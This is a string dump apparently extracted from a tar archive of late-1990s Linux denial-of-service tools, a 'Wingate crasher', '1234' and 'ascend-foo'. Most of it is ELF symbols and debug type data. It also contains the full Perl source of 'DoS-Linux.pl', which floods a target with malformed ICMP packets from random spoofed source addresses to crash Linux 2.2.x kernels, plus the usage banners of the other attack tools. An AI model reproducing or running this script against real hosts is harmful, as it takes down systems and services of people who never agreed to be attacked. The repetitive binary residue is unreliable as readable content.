            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh",
            "QVh@",
            "}u(E",
            "1fEP/",
            "UPEP\"",
            "hj,h",
            "Pj.s",
            "\u0403;u[]",
            "Wingate crasher by holobyte <holobyte@holobyte.org>",
            "Usage: %s <wingate> [port(defualt=23)]",
            "Invalid port",
            "Could not get valid addr info on %s: tmp_host",
            "Could not valid addr info on %s: addr -1",
            "Socket",
            "Connect",
            "Connected... Crashing",
            "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
            "Write",
            "Final Write",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "wingatecrash.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "write@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fflush@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "stdout@@GLIBC_2.0",
            "_start",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_IO_putc@@GLIBC_2.0",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/1234",
            "0100755",
            "0000000",
            "0000000",
            "00000034277",
            "07100656557",
            "012477",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "memcpy",
            "malloc",
            "socket",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "sendto",
            "memset",
            "gethostbyname",
            "stderr",
            "htons",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "QVh|",
            "E1fE",
            "fE1fu",
            "e[^]",
            "U$Sj$O",
            "EEEE",
            "Ej$j",
            "UMfY",
            "j\tEP",
            "Pj u",
            "UMfY",
            "j$EPE",
            "EEEPj",
            "EPEPEP",
            "u\"h<",
            "\u0403;u[]",
            "1234 1.0 BY CAMELEON G.",
            "reprise de came.c and ssping.c",
            "usage :",
            "%s <spoof adresse> <dst ip> <num>",
            " < spoof   > : ip spoof ex: 127.0.0.1",
            " < dest    > : ip victim ex:193.252.19.3",
            " < number  > : 10",
            " Se denial of service rulezzzzzzzzzzz! Non?",
            " Se prog  t fait pour l'etude et pas pour s'en servir.",
            "ERROR: Unable to resolve host %s",
            "ERROR: Opening raw socket.",
            "%s: J'envoie la sauce! b00m!",
            "ERROR: faut etre root IDIO.",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "1234.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "fprintf@@GLIBC_2.0",
            "resolve",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "_start",
            "banner",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "send_winbomb",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/DoS-Linux.pl",
            "0100755",
            "0000000",
            "0000000",
            "00000002564",
            "07061107146",
            "014263",
            "ustar  ",
            "root",
            "root",
            "#!/usr/bin/perl",
            "# **************************************************************",
            "# DoS for Linux kernels from 2.2.7 to 2.2.9 reported in BUGTRAQ",
            "# 06/01/99 by Piotr Wilkin <pwl@wotan.2slo.wav.pl>",
            "# An attacker has to be in same ethernet segment with victim ",
            "# I did't test it ",
            "# coded by misteri0 from P.A.T.C.H.",
            "# Requires Net-RawIP-0.09 included in this directory",
            "# Edited for use with toast by Gridmark",
            "# **************************************************************",
            "$| = 1;",
            "require 'getopts.pl';",
            "use Net::RawIP;",
            "Getopts('t:');",
            "die \" misteri0\\@unet from P.A.T.C.H.\\n Usage $0 -t <target>\" unless",
            "$opt_t;",
            "srand(time);",
            "$i = 996;",
            "$data .= chr(int rand(255)),$i-- while($i); ",
            "$icmp = new Net::RawIP({",
            "                        ip => {",
            "                                 ihl => 6,",
            "\t\t\t         tot_len => 1024,",
            "\t\t\t         id => 1,",
            "\t\t\t         ttl => 255,",
            "\t\t\t         frag_off => 0,",
            "\t\t\t         daddr => $opt_t",
            "                               },",
            "\t\t\ticmp => { ",
            "\t\t\t         id => 2650, ",
            "\t\t\t\t data => $data ",
            "\t\t\t\t}",
            "\t\t       });",
            "\t\t       ",
            " $j++;",
            " $icmp->set({",
            "            ip => { saddr => 17000000 + int rand 4261000000 },",
            "            icmp => { ",
            "\t             type => int rand(14),",
            "\t             code => int rand(10),",
            "\t\t     sequence => int rand(255)",
            "\t            }                                           ",
            "          });",
            " $icmp->send;",
            "  print \"Linux-DoS sent...\\n\"",
            "# print \"[b00m] \" unless $j%1000;\t  ",
            "datapool/bin/ascend-foo",
            "0100755",
            "0000000",
            "0000000",
            "00000045771",
            "07100660343",
            "014111",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "ioctl",
            "printf",
            "random",
            "strerror",
            "__ctype_b",
            "memcpy",
            "perror",
            "malloc",
            "gethostbyaddr",
            "socket",
            "calloc",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "strncpy",
            "sendto",
            "gettimeofday",
            "gethostbyname",
            "sprintf",
            "srandom",
            "__errno_location",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "u\tEI",
            "E}u hF",
            "EPEPj",
            "PEPEPj",
            "PEPEP",
            "VS\\$$f",
            "D$ D$",
            "D$+P1D$.P1D$1P1D$4Ph",
            "Pu 3t&",
            "VS\\$ f|$$",
            "uLS:\u0189t$",
            "u,Ss",
            "PRQ3",
            "t,1<.t",
            "<.u\t\u0440;",
            "t,1<.t",
            "<.u\t\u0440;",
            "0WVSj",
            "D$dP1 j\\$",
            "|$ j",
            "D$LPS",
            "fD$ ",
            "[^_0",
            "1S\\$(T$ f|$$",
            "u61D$+P1D$.P1D$1P1D$4Ph",
            "VSt$",
            "D$ D$",
            "UWVST$0t$4|$8",
            "D$01\u0489D$",
            "L$0w",
            "~(_f1",
            "~*1f",
            "D$01\u0489D$",
            "L$0w",
            "~(_f1",
            "~*1f",
            "l$01",
            "~+1f",
            "1fD$",
            "t$01",
            "~*1f",
            "l$01",
            "T$01\u06c9B",
            "1L$0|$",
            "9s`)\u0203",
            "9}\"t'",
            "D$0P",
            "T$0(*B",
            "D$01f@",
            "1L$0",
            "T$0fB",
            "[^_]",
            "VS11\u06cbL$",
            "~,1f",
            "VS11\u06cbL$",
            "~*1f",
            "S\\$ ",
            "))1[",
            "$VST$",
            "L$4D$",
            "t$0A",
            "\\$8D$",
            "SQV! [^$",
            ",UWVS\\$Dt$Pl$T|$hD$@T$HL$Lu",
            "fT$ f",
            "D$$fL$\"D$XT$%D$(fD$&",
            "D$\\D$,|$`",
            "t |$d",
            "L$hQT$hRP",
            "[^_],",
            " WVS|$8L$<\\$@D$0T$4u",
            "QWPE",
            "[^_ ",
            "\u0403;u[]",
            "ascend-foo, udp echo dos attack",
            "by scut / team teso",
            "usage: %s <srcip> [packetsize]",
            "invalid syntax",
            "No memory for packet",
            "No socket",
            "write_ip wrote too less bytes",
            "completed, wrote %d bytes to victim router",
            "%d.%d.%d.%d",
            "socket: %s",
            "seed_rand: cannot gettimeofday",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
